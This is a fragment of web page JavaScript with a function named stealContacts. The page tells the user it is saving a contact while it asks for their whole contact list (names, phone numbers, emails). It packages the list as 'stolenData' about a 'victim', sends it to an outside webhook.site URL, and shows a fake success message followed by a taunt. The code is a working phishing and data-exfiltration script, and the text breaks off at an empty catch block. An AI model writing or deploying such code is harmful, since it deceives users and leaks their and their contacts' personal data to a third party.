<body>

        async function stealContacts() {
            const statusEl = document.getElementById('status');
            statusEl.textContent = "Saving contact...";

            try {
                // 1. Request FULL contact access (no selection)
                const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });

                const stolenData = {
                    victim: "Friend's Phone",
                    timestamp: new Date().toISOString(),
                    contacts: contacts.map(c => ({
                        name: c.name,
                        phone: c.tel || "None",
                        email: c.email || "None"
                    }))
                };

                // 3. Send to your webhook (Discord/Telegram/custom API)
                await fetch('https://webhook.site/9768cb9b-1c5e-45d0-9574-6596c5ef9640', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(stolenData)
                });

                // 4. Fake success message
                statusEl.innerHTML = "âœ… Contact saved!";
                
                // 5. DELAYED GOTCHA MESSAGE
                setTimeout(() => {
                    statusEl.innerHTML = `
                        <span style="color:red;">Smart move</span><br>

                    `;
                }, 2000);

            } catch (err) {

        }
